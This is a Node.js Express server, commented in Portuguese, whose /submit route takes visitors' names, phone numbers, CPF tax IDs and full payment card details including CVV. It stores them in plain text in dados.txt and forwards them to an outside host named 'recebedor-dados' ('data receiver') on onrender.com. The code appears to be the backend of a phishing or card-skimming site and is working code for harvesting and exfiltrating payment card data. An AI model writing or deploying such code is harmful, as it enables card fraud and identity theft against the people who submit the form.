const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch'); // Importando a biblioteca fetch

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para lidar com dados do formulário
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Servir arquivos estáticos da pasta public
app.use(express.static(path.join(__dirname, 'public')));

// Mensagem de depuração
console.log('Diretório atual:', __dirname);

// Rota para servir o arquivo index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Rota para receber os dados do formulário
app.post('/submit', (req, res) => {
  const { nome, telefone, cpf, nomeTitular, numeroCartao, dataValidade, cvv } = req.body;
  const data = `Nome: ${nome}, Telefone: ${telefone}, CPF: ${cpf}, Nome do Titular: ${nomeTitular}, Número do Cartão: ${numeroCartao}, Data de Validade: ${dataValidade}, CVV: ${cvv}\n`;

  // Salvar os dados em um arquivo txt
  fs.appendFile('dados.txt', data, (err) => {
    if (err) {
      console.error('Erro ao salvar os dados:', err);
      res.status(500).send('Erro ao salvar os dados.');
    } else {
      // Enviar dados para o segundo site
      fetch('https://recebedor-dados.onrender.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(req.body) // Enviando os dados como JSON
      })
      .then(response => {
        if (response.ok) {
          // Redirecionar para a página de confirmação após o envio dos dados
          res.redirect('/confirmation.html');
        } else {
          res.status(500).send('Erro ao enviar dados para o servidor de recebimento.');
        }
      })
      .catch(error => {
        console.error('Erro ao enviar dados:', error);
        res.status(500).send('Erro ao enviar dados.');
      });
    }
  });
});

// Iniciar o servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
